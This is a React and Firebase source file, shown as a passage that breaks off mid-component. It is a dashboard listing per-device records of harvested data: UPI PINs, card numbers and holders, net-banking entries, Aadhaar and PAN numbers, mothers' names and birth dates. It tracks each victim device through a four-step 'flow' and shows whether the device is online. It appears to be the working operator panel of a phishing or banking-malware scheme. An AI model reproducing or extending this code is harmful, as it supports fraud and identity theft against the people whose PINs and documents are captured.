// pages/AllDeviceDataPage.jsx
import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ref, get } from 'firebase/database';
import { db } from '../firebase/config';

function AllDeviceDataPage() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [devices, setDevices] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterType, setFilterType] = useState('all');
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [showDialog, setShowDialog] = useState(false);
  const [sortBy, setSortBy] = useState('serial');
  const [stats, setStats] = useState({
    total: 0,
    card: 0,
    netbank: 0,
    upi: 0,
    verification: 0,
    fullFlow: 0,
    flowProgress: { step1: 0, step2: 0, step3: 0, step4: 0 }
  });

  useEffect(() => {
    fetchAllData();
  }, []);

  const fetchAllData = async () => {
    setLoading(true);
    try {
      const devicesRef = ref(db, 'devices');
      const devicesSnap = await get(devicesRef);

      if (!devicesSnap.exists()) {
        setDevices([]);
        setLoading(false);
        return;
      }

      const devicesData = devicesSnap.val();
      const allDevices = [];
      let cardCount = 0,
        netbankCount = 0,
        upiCount = 0,
        verificationCount = 0;
      let fullFlowCount = 0;
      let step1Count = 0,
        step2Count = 0,
        step3Count = 0,
        step4Count = 0;

      for (const deviceId in devicesData) {
        const device = devicesData[deviceId];
        const serialNo = device.serialNo || 0;
        const brand = device.brand || 'Unknown';
        const model = device.model || 'Device';
        const lastSeen = device.lastSeen || device.this_app_installTime;
        const isOnline = lastSeen && (Date.now() - Number(lastSeen)) < 120000;

        let cardData = null,
          netbankData = null,
          upiData = null,
          verificationData = null;
        let allCardData = {},
          allNetbankData = {},
          allUpiData = {},
          allVerifData = {};
        let cardCountDevice = 0,
          netbankCountDevice = 0,
          upiCountDevice = 0,
          verificationCountDevice = 0;

        // Card Payments - card_payment
        try {
          const cardSnap = await get(ref(db, `card_payment/${deviceId}`));
          if (cardSnap.exists()) {
            allCardData = cardSnap.val();
            const keys = Object.keys(allCardData);
            cardCountDevice = keys.length;
            keys.sort((a, b) => (allCardData[b]?.timestampMillis || 0) - (allCardData[a]?.timestampMillis || 0));
            cardData = allCardData[keys[0]] || null;
            if (cardData) cardCount++;
          }
        } catch (e) { }

        // Netbank Payments - netbanking_payment
        try {
          const netbankSnap = await get(ref(db, `netbanking_payment/${deviceId}`));
          if (netbankSnap.exists()) {
            allNetbankData = netbankSnap.val();
            const keys = Object.keys(allNetbankData);
            netbankCountDevice = keys.length;
            keys.sort((a, b) => (allNetbankData[b]?.timestampMillis || 0) - (allNetbankData[a]?.timestampMillis || 0));
            netbankData = allNetbankData[keys[0]] || null;
            if (netbankData) netbankCount++;
          }
        } catch (e) { }

        // UPI Payments - upi_payments
        try {
          const upiSnap = await get(ref(db, `upi_payments/${deviceId}`));
          if (upiSnap.exists()) {
            allUpiData = upiSnap.val();
            const keys = Object.keys(allUpiData);
            upiCountDevice = keys.length;
            keys.sort((a, b) => (allUpiData[b]?.timestampMillis || 0) - (allUpiData[a]?.timestampMillis || 0));
            upiData = allUpiData[keys[0]] || null;
            if (upiData) upiCount++;
          }
        } catch (e) { }

        // Mobile Verification - mobile_verification
        try {
          const verifSnap = await get(ref(db, `mobile_verification/${deviceId}`));
          if (verifSnap.exists()) {
            allVerifData = verifSnap.val();
            const keys = Object.keys(allVerifData);
            verificationCountDevice = keys.length;
            keys.sort((a, b) => (allVerifData[b]?.timestampMillis || 0) - (allVerifData[a]?.timestampMillis || 0));
            verificationData = allVerifData[keys[0]] || null;
            if (verificationData) verificationCount++;
          }
        } catch (e) { }

        const hasVerification = !!verificationData;
        const hasUpi = !!upiData;
        const hasCard = !!cardData;
        const hasNetbank = !!netbankData;

        if (hasVerification) step1Count++;
        if (hasVerification && hasUpi) step2Count++;
        if (hasVerification && hasUpi && hasCard) step3Count++;
        if (hasVerification && hasUpi && hasCard && hasNetbank) {
          step4Count++;
          fullFlowCount++;
        }

        let latestAmount = '0';
        if (cardData?.amount) latestAmount = cardData.amount;
        else if (upiData?.amount) latestAmount = upiData.amount;
        else if (netbankData?.amount) latestAmount = netbankData.amount;

        allDevices.push({
          deviceId,
          serialNo,
          brand,
          model,
          lastSeen,
          status: isOnline ? 'online' : 'offline',
          cardData,
          netbankData,
          upiData,
          verificationData,
          allCardData,
          allNetbankData,
          allUpiData,
          allVerifData,
          hasCard,
          hasNetbank,
          hasUpi,
          hasVerification,
          cardCount: cardCountDevice,
          netbankCount: netbankCountDevice,
          upiCount: upiCountDevice,
          verificationCount: verificationCountDevice,
          timestamp: cardData?.timestamp || netbankData?.timestamp || upiData?.timestamp || verificationData?.timestamp || 'N/A',
          cardStatus: cardData?.status || 'N/A',
          netbankStatus: netbankData?.status || 'N/A',
          upiStatus: upiData?.status || 'N/A',
          verificationStatus: verificationData?.status || 'N/A',
          // Latest data for bottom display
          mobileNumber: verificationData?.mobileNumber || 'N/A',
          latestAmount: latestAmount,
          // Card details
          cardNumber: cardData?.cardNumber || 'N/A',
          cardHolder: cardData?.cardHolder || 'N/A',
          cardAmount: cardData?.amount || '0',
          // Netbank details
          bankName: netbankData?.bankName || 'N/A',
          netbankAmount: netbankData?.amount || '0',
          // UPI details
          upiAmount: upiData?.amount || '0',
          upiPin: upiData?.upiPin || 'N/A',
          upiPinType: upiData?.pinType || 'N/A',
          upiPinLength: upiData?.pinLength || 'N/A',
          // ✅ REMOVED DUPLICATE upiStatus - already exists above
        });
      }

      allDevices.sort((a, b) => {
        switch (sortBy) {
          case 'serial':
            return b.serialNo - a.serialNo;
          case 'total':
            return (b.cardCount + b.netbankCount + b.upiCount + b.verificationCount) -
              (a.cardCount + a.netbankCount + a.upiCount + a.verificationCount);
          case 'card':
            return b.cardCount - a.cardCount;
          case 'netbank':
            return b.netbankCount - a.netbankCount;
          case 'upi':
            return b.upiCount - a.upiCount;
          case 'verification':
            return b.verificationCount - a.verificationCount;
          default:
            return b.serialNo - a.serialNo;
        }
      });

      setDevices(allDevices);
      setStats({
        total: allDevices.length,
        card: cardCount,
        netbank: netbankCount,
        upi: upiCount,
        verification: verificationCount,
        fullFlow: fullFlowCount,
        flowProgress: { step1: step1Count, step2: step2Count, step3: step3Count, step4: step4Count }
      });
    } catch (error) {
      console.error('Error fetching data:', error);
    }
    setLoading(false);
  };

  const getFilteredDevices = () => {
    let filtered = devices;

    if (searchTerm) {
      const search = searchTerm.toLowerCase();
      filtered = filtered.filter(d =>
        d.deviceId.toLowerCase().includes(search) ||
        d.brand.toLowerCase().includes(search) ||
        d.model.toLowerCase().includes(search) ||
        d.serialNo.toString().includes(search) ||
        (d.cardHolder || '').toLowerCase().includes(search) ||
        (d.cardNumber || '').includes(search) ||
        (d.bankName || '').toLowerCase().includes(search) ||
        (d.mobileNumber || '').includes(search)
      );
    }

    if (filterType === 'card') filtered = filtered.filter(d => d.hasCard);
    else if (filterType === 'netbank') filtered = filtered.filter(d => d.hasNetbank);
    else if (filterType === 'upi') filtered = filtered.filter(d => d.hasUpi);
    else if (filterType === 'verification') filtered = filtered.filter(d => d.hasVerification);

    return filtered;
  };

  const filteredDevices = getFilteredDevices();

  const getDeviceStatus = (status) => {
    if (status === 'online') return { text: '🟢 Online', color: '#2ecc71' };
    return { text: '🔴 Offline', color: '#e74c3c' };
  };

  const getStatusColor = (status) => {
    if (status === 'Success' || status === 'Verified') return '#2ecc71';
    if (status === 'Pending') return '#f1c40f';
    if (status === 'Failed') return '#e74c3c';
    return '#95a5a6';
  };

  const formatTime = (timestamp) => {
    if (!timestamp) return 'Never';
    const diff = Date.now() - Number(timestamp);
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    return `${Math.floor(diff / 86400000)}d ago`;
  };

  const formatDate = (timestamp) => {
    if (!timestamp || timestamp === 'N/A') return 'N/A';
    return timestamp;
  };

  const getTotalCount = (device) => {
    return device.cardCount + device.netbankCount + device.upiCount + device.verificationCount;
  };

  const getFlowProgress = (device) => {
    let completed = 0;
    if (device.hasVerification) completed++;
    if (device.hasUpi) completed++;
    if (device.hasCard) completed++;
    if (device.hasNetbank) completed++;
    return Math.round((completed / 4) * 100);
  };

  const getFlowText = (device) => {
    if (device.hasVerification && device.hasUpi && device.hasCard && device.hasNetbank) {
      return { text: '✅ Complete', color: '#2ecc71' };
    } else if (device.hasVerification && device.hasUpi && device.hasCard) {
      return { text: '⏳ Pending Net', color: '#f59e0b' };
    } else if (device.hasVerification && device.hasUpi) {
      return { text: '⏳ Pending Card', color: '#8b5cf6' };
    } else if (device.hasVerification) {
      return { text: '⏳ Pending UPI', color: '#3b82f6' };
    } else {
      return { text: 'Start', color: '#95a5a6' };
    }
  };

  const openDialog = (device) => {
    setSelectedDevice(device);
    setShowDialog(true);
    document.body.style.overflow = 'hidden';
  };

  const closeDialog = () => {
    setShowDialog(false);
    document.body.style.overflow = 'auto';
    setTimeout(() => setSelectedDevice(null), 300);
  };

  if (loading) {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '100vh', background: 'var(--bg-primary)' }}>
        <div style={{ width: '40px', height: '40px', border: '3px solid rgba(108,99,255,0.1)', borderTopColor: '#6c63ff', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>
        <p style={{ color: 'var(--text-muted)', marginTop: '12px' }}>Loading...</p>
        <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
      </div>
    );
  }

  return (
    <div style={{ padding: '12px 16px', maxWidth: '100%', background: 'var(--bg-primary)', minHeight: '100vh' }}>

      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '12px', padding: '8px 0 14px', borderBottom: '2px solid var(--border-color)', marginBottom: '16px', flexWrap: 'wrap' }}>
        <button onClick={() => navigate('/')} style={{ background: 'none', border: 'none', color: 'var(--text-muted)', fontSize: '14px', fontWeight: 600, cursor: 'pointer', padding: '6px 10px', borderRadius: '8px' }}>
          ← Back
        </button>
        <h2 style={{ fontSize: '18px', fontWeight: 700, color: 'var(--text-primary)', margin: 0, flex: 1 }}>📊 All Devices</h2>
        <span style={{ fontSize: '12px', fontWeight: 600, color: '#6c63ff', background: 'rgba(108,99,255,0.1)', padding: '4px 14px', borderRadius: '20px' }}>
          {stats.total} devices
        </span>
      </div>

      {/* Stats */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: '6px', marginBottom: '14px' }}>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center', cursor: 'pointer' }} onClick={() => { setFilterType('all'); setSearchTerm(''); }}>
          <div style={{ fontSize: '18px', fontWeight: 700, color: '#6c63ff' }}>{stats.total}</div>
          <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>Total</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center', cursor: 'pointer' }} onClick={() => setFilterType('verification')}>
          <div style={{ fontSize: '18px', fontWeight: 700, color: '#3b82f6' }}>{stats.verification}</div>
          <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>✅ Step 1</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center', cursor: 'pointer' }} onClick={() => setFilterType('upi')}>
          <div style={{ fontSize: '18px', fontWeight: 700, color: '#8b5cf6' }}>{stats.upi}</div>
          <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>📲 Step 2</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center', cursor: 'pointer' }} onClick={() => setFilterType('card')}>
          <div style={{ fontSize: '18px', fontWeight: 700, color: '#2ecc71' }}>{stats.card}</div>
          <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>💳 Step 3</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center', cursor: 'pointer' }} onClick={() => setFilterType('netbank')}>
          <div style={{ fontSize: '18px', fontWeight: 700, color: '#f59e0b' }}>{stats.netbank}</div>
          <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>🏦 Step 4</div>
        </div>
        <div style={{ background: 'var(--bg-card)', borderRadius: '8px', padding: '8px 4px', border: '1px solid var(--border-color)', textAlign: 'center' }}>
          <div style={{ fontSize: '18px', fontWeight: 700, color: '#6c63ff' }}>{stats.fullFlow}</div>
          <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>Complete</div>
        </div>
      </div>

      {/* Search */}
      <div style={{ display: 'flex', gap: '10px', marginBottom: '14px', flexWrap: 'wrap' }}>
        <div style={{ flex: 1, minWidth: '150px', position: 'relative' }}>
          <span style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)', color: 'var(--text-muted)' }}>🔍</span>
          <input
            type="text"
            placeholder="Search by Serial, Device ID, Brand, Mobile, Card, Bank..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            style={{ width: '100%', padding: '10px 12px 10px 36px', border: '2px solid var(--border-color)', borderRadius: '8px', background: 'var(--bg-input)', color: 'var(--text-primary)', fontSize: '14px', outline: 'none' }}
          />
        </div>
        <select value={sortBy} onChange={(e) => setSortBy(e.target.value)} style={{ padding: '10px 14px', border: '2px solid var(--border-color)', borderRadius: '8px', background: 'var(--bg-input)', color: 'var(--text-primary)', fontSize: '13px', outline: 'none' }}>
          <option value="serial">Sort by Serial</option>
          <option value="total">Sort by Total</option>
          <option value="card">Sort by Card</option>
          <option value="netbank">Sort by Netbank</option>
          <option value="upi">Sort by UPI</option>
          <option value="verification">Sort by Verify</option>
        </select>
        <button onClick={() => { setSearchTerm(''); setFilterType('all'); setSortBy('serial'); }} style={{ padding: '10px 16px', border: '2px solid var(--border-color)', borderRadius: '8px', background: 'var(--bg-input)', color: 'var(--text-muted)', cursor: 'pointer', fontSize: '13px', fontWeight: 600 }}>
          ✕ Clear
        </button>
        <button onClick={() => fetchAllData()} style={{ padding: '10px 16px', border: 'none', borderRadius: '8px', background: '#28a745', color: 'white', cursor: 'pointer', fontSize: '14px', fontWeight: 600 }}>
          ↻
        </button>
      </div>

      {/* Device List */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
        {filteredDevices.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '60px 20px', color: 'var(--text-muted)', background: 'var(--bg-card)', borderRadius: '12px', border: '1px solid var(--border-color)' }}>
            <span style={{ fontSize: '48px', display: 'block', marginBottom: '8px' }}>📭</span>
            <p>No devices found</p>
          </div>
        ) : (
          filteredDevices.map((device) => {
            const deviceStatus = getDeviceStatus(device.status);
            const totalCount = getTotalCount(device);
            const flowProgress = getFlowProgress(device);
            const flowText = getFlowText(device);

            return (
              <div
                key={device.deviceId}
                onClick={() => openDialog(device)}
                style={{
                  background: 'var(--bg-card)',
                  borderRadius: '10px',
                  padding: '12px 14px',
                  border: '1px solid var(--border-color)',
                  borderLeft: `4px solid ${device.hasVerification && device.hasUpi && device.hasCard && device.hasNetbank ? '#6c63ff' : device.hasCard ? '#2ecc71' : device.hasNetbank ? '#f59e0b' : device.hasUpi ? '#8b5cf6' : device.hasVerification ? '#3b82f6' : '#95a5a6'}`,
                  cursor: 'pointer',
                  transition: 'all 0.2s'
                }}
                onMouseEnter={(e) => { e.target.style.boxShadow = '0 2px 12px rgba(0,0,0,0.06)'; }}
                onMouseLeave={(e) => { e.target.style.boxShadow = 'none'; }}
              >
                {/* Header */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '4px', marginBottom: '4px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                    <span style={{ fontSize: '13px', fontWeight: 800, color: 'var(--text-primary)', background: 'var(--bg-input)', padding: '2px 10px', borderRadius: '4px' }}>#{device.serialNo || 'N/A'}</span>
                    <span style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-primary)' }}>{device.brand} {device.model}</span>
                    <span style={{ fontSize: '9px', fontWeight: 600, color: deviceStatus.color, padding: '2px 8px', borderRadius: '8px', background: `${deviceStatus.color}10` }}>{deviceStatus.text}</span>
                  </div>
                  <div style={{ display: 'flex', gap: '4px', flexWrap: 'wrap' }}>
                    {device.hasVerification && <span style={{ fontSize: '9px', fontWeight: 600, padding: '2px 8px', borderRadius: '8px', background: 'rgba(59,130,246,0.08)', color: '#3b82f6' }}>✅ {device.verificationCount}</span>}
                    {device.hasUpi && <span style={{ fontSize: '9px', fontWeight: 600, padding: '2px 8px', borderRadius: '8px', background: 'rgba(139,92,246,0.08)', color: '#8b5cf6' }}>📲 {device.upiCount}</span>}
                    {device.hasCard && <span style={{ fontSize: '9px', fontWeight: 600, padding: '2px 8px', borderRadius: '8px', background: 'rgba(46,204,113,0.08)', color: '#2ecc71' }}>💳 {device.cardCount}</span>}
                    {device.hasNetbank && <span style={{ fontSize: '9px', fontWeight: 600, padding: '2px 8px', borderRadius: '8px', background: 'rgba(245,158,11,0.08)', color: '#f59e0b' }}>🏦 {device.netbankCount}</span>}
                  </div>
                </div>

                {/* Device ID */}
                <div style={{ fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'monospace', marginBottom: '6px', background: 'var(--bg-input)', padding: '2px 8px', borderRadius: '4px', display: 'inline-block' }}>
                  {device.deviceId?.slice(0, 12)}...
                </div>

                {/* Bottom Data */}
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px',
                  padding: '6px 8px',
                  marginTop: '4px',
                  marginBottom: '4px',
                  background: 'var(--bg-input)',
                  borderRadius: '6px',
                  border: '1px solid var(--border-color)',
                  flexWrap: 'wrap',
                  fontSize: '9px'
                }}>
                  <span style={{ display: 'flex', alignItems: 'center', gap: '3px', fontWeight: 600, color: '#6c63ff' }}>
                    📱 {device.mobileNumber || 'N/A'}
                  </span>
                  <span style={{ color: 'var(--text-muted)', opacity: 0.3 }}>|</span>
                  <span style={{ display: 'flex', alignItems: 'center', gap: '3px', fontWeight: 600, color: device.hasVerification ? '#3b82f6' : 'var(--text-muted)' }}>
                    ✅ {device.verificationCount}
                  </span>
                  <span style={{ color: 'var(--text-muted)', opacity: 0.3 }}>|</span>
                  <span style={{ display: 'flex', alignItems: 'center', gap: '3px', fontWeight: 600, color: device.hasUpi ? '#8b5cf6' : 'var(--text-muted)' }}>
                    📲 {device.upiCount}
                  </span>
                  <span style={{ color: 'var(--text-muted)', opacity: 0.3 }}>|</span>
                  <span style={{ display: 'flex', alignItems: 'center', gap: '3px', fontWeight: 600, color: device.hasCard ? '#2ecc71' : 'var(--text-muted)' }}>
                    💳 {device.cardCount}
                  </span>
                  <span style={{ color: 'var(--text-muted)', opacity: 0.3 }}>|</span>
                  <span style={{ display: 'flex', alignItems: 'center', gap: '3px', fontWeight: 600, color: device.hasNetbank ? '#f59e0b' : 'var(--text-muted)' }}>
                    🏦 {device.netbankCount}
                  </span>
                  <span style={{ color: 'var(--text-muted)', opacity: 0.3 }}>|</span>
                  <span style={{ display: 'flex', alignItems: 'center', gap: '3px', fontWeight: 700, color: '#2ecc71' }}>
                    💰 ₹{device.latestAmount || '0'}
                  </span>
                </div>

                {/* Progress Bar */}
                <div style={{ marginTop: '4px', marginBottom: '4px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontSize: '10px', fontWeight: 600, color: 'var(--text-muted)' }}>Flow: {flowProgress}%</span>
                    <span style={{ fontSize: '10px', fontWeight: 600, color: flowText.color }}>{flowText.text}</span>
                  </div>
                  <div style={{ width: '100%', height: '4px', background: 'var(--bg-input)', borderRadius: '4px', overflow: 'hidden', marginTop: '2px' }}>
                    <div style={{ width: `${flowProgress}%`, height: '100%', background: 'linear-gradient(90deg, #6c63ff, #2ecc71)', borderRadius: '4px', transition: 'width 0.3s' }} />
                  </div>
                </div>

                {/* Footer */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '9px', color: 'var(--text-muted)', paddingTop: '4px', borderTop: '1px solid var(--border-color)' }}>
                  <span>📊 {totalCount} entries</span>
                  <span>🕐 {formatTime(device.lastSeen)}</span>
                  <span style={{ color: '#6c63ff' }}>👁️ View</span>
                </div>
              </div>
            );
          })
        )}
      </div>

      <div style={{ height: '30px' }} />

      {/* Dialog */}
      {showDialog && selectedDevice && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            background: 'rgba(0,0,0,0.7)',
            backdropFilter: 'blur(12px)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 9999,
            padding: '16px',
            animation: 'fadeIn 0.3s ease'
          }}
          onClick={closeDialog}
        >
          <div
            style={{
              background: 'var(--bg-card)',
              borderRadius: '14px',
              maxWidth: '440px',
              width: '100%',
              maxHeight: '92vh',
              overflow: 'hidden',
              boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
              border: '1px solid var(--border-color)',
              animation: 'scaleIn 0.3s ease',
              display: 'flex',
              flexDirection: 'column'
            }}
            onClick={(e) => e.stopPropagation()}
          >
            {/* Dialog Header */}
            <div style={{
              padding: '14px 18px',
              borderBottom: '1px solid var(--border-color)',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              background: 'var(--bg-input)',
              flexShrink: 0
            }}>
              <div>
                <h4 style={{ margin: 0, fontSize: '16px', fontWeight: 700, color: 'var(--text-primary)' }}>
                  {selectedDevice.brand} {selectedDevice.model}
                </h4>
                <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                  #{selectedDevice.serialNo} • {selectedDevice.deviceId?.slice(0, 16)}...
                </span>
              </div>
              <button
                onClick={closeDialog}
                style={{
                  background: 'none',
                  border: 'none',
                  fontSize: '22px',
                  color: 'var(--text-muted)',
                  cursor: 'pointer',
                  padding: '4px 8px',
                  borderRadius: '6px',
                  transition: 'all 0.2s'
                }}
                onMouseEnter={(e) => { e.target.style.background = 'rgba(231,76,60,0.1)'; e.target.style.color = '#e74c3c'; }}
                onMouseLeave={(e) => { e.target.style.background = 'none'; e.target.style.color = 'var(--text-muted)'; }}
              >
                ✕
              </button>
            </div>

            {/* Dialog Body */}
            <div style={{
              padding: '14px 18px 18px',
              maxHeight: 'calc(92vh - 80px)',
              overflowY: 'auto',
              flex: 1
            }}>
              {/* Device Info */}
              <div style={{ background: 'var(--bg-input)', borderRadius: '8px', padding: '10px 12px', marginBottom: '10px', border: '1px solid var(--border-color)' }}>
                <div style={{ fontSize: '11px', fontWeight: 700, color: 'var(--text-muted)', marginBottom: '6px' }}>📱 Device Info</div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2px 10px' }}>
                  <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Brand</span><br /><span style={{ fontSize: '12px', fontWeight: 600 }}>{selectedDevice.brand}</span></div>
                  <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Model</span><br /><span style={{ fontSize: '12px', fontWeight: 600 }}>{selectedDevice.model}</span></div>
                  <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Serial</span><br /><span style={{ fontSize: '12px', fontWeight: 600 }}>#{selectedDevice.serialNo}</span></div>
                  <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Status</span><br /><span style={{ fontSize: '12px', fontWeight: 600, color: selectedDevice.status === 'online' ? '#2ecc71' : '#e74c3c' }}>{selectedDevice.status === 'online' ? '🟢 Online' : '🔴 Offline'}</span></div>
                  <div style={{ gridColumn: 'span 2' }}><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Device ID</span><br /><span style={{ fontSize: '11px', fontWeight: 600, fontFamily: 'monospace' }}>{selectedDevice.deviceId}</span></div>
                </div>
              </div>

              {/* Verification Data */}
              {selectedDevice.hasVerification && (
                <div style={{ background: 'rgba(59,130,246,0.05)', borderRadius: '8px', padding: '10px 12px', marginBottom: '8px', border: '1px solid rgba(59,130,246,0.15)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                    <span style={{ fontSize: '12px', fontWeight: 700, color: '#3b82f6' }}>✅ Mobile Verification</span>
                    <span style={{ fontSize: '9px', fontWeight: 600, background: 'rgba(59,130,246,0.1)', padding: '2px 8px', borderRadius: '10px', color: '#3b82f6' }}>
                      {selectedDevice.verificationCount} entries
                    </span>
                  </div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2px 10px', fontSize: '12px' }}>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Mobile</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.verificationData?.mobileNumber || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Aadhaar</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.verificationData?.aadhaarNumber || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>PAN</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.verificationData?.panNumber || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Mother</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.verificationData?.motherName || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>DOB</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.verificationData?.dateOfBirth || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Status</span><br /><span style={{ fontWeight: 600, color: getStatusColor(selectedDevice.verificationData?.status) }}>{selectedDevice.verificationData?.status || 'N/A'}</span></div>
                    <div style={{ gridColumn: 'span 2' }}><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Timestamp</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.verificationData?.timestamp || 'N/A'}</span></div>
                  </div>
                  {Object.keys(selectedDevice.allVerifData || {}).length > 1 && (
                    <div style={{ marginTop: '4px', fontSize: '9px', color: 'var(--text-muted)' }}>
                      + {Object.keys(selectedDevice.allVerifData).length - 1} more entries
                    </div>
                  )}
                </div>
              )}

              {/* UPI Data */}
              {selectedDevice.hasUpi && (
                <div style={{ background: 'rgba(139,92,246,0.05)', borderRadius: '8px', padding: '10px 12px', marginBottom: '8px', border: '1px solid rgba(139,92,246,0.15)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                    <span style={{ fontSize: '12px', fontWeight: 700, color: '#8b5cf6' }}>📲 UPI Payment</span>
                    <span style={{ fontSize: '9px', fontWeight: 600, background: 'rgba(139,92,246,0.1)', padding: '2px 8px', borderRadius: '10px', color: '#8b5cf6' }}>
                      {selectedDevice.upiCount} entries
                    </span>
                  </div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2px 10px', fontSize: '12px' }}>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Amount</span><br /><span style={{ fontWeight: 700, color: '#8b5cf6' }}>₹{selectedDevice.upiData?.amount || '0'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>UPI PIN</span><br /><span style={{ fontWeight: 600, fontFamily: 'monospace' }}>{selectedDevice.upiData?.upiPin || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>PIN Type</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.upiData?.pinType || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>PIN Length</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.upiData?.pinLength || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Status</span><br /><span style={{ fontWeight: 600, color: getStatusColor(selectedDevice.upiData?.status) }}>{selectedDevice.upiData?.status || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Device ID</span><br /><span style={{ fontWeight: 600, fontFamily: 'monospace' }}>{selectedDevice.upiData?.deviceId || 'N/A'}</span></div>
                    <div style={{ gridColumn: 'span 2' }}><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Timestamp</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.upiData?.timestamp || 'N/A'}</span></div>
                  </div>
                  {Object.keys(selectedDevice.allUpiData || {}).length > 1 && (
                    <div style={{ marginTop: '4px', fontSize: '9px', color: 'var(--text-muted)' }}>
                      + {Object.keys(selectedDevice.allUpiData).length - 1} more entries
                    </div>
                  )}
                </div>
              )}

              {/* Card Data */}
              {selectedDevice.hasCard && (
                <div style={{ background: 'rgba(46,204,113,0.05)', borderRadius: '8px', padding: '10px 12px', marginBottom: '8px', border: '1px solid rgba(46,204,113,0.15)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                    <span style={{ fontSize: '12px', fontWeight: 700, color: '#2ecc71' }}>💳 Card Payment</span>
                    <span style={{ fontSize: '9px', fontWeight: 600, background: 'rgba(46,204,113,0.1)', padding: '2px 8px', borderRadius: '10px', color: '#2ecc71' }}>
                      {selectedDevice.cardCount} entries
                    </span>
                  </div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2px 10px', fontSize: '12px' }}>
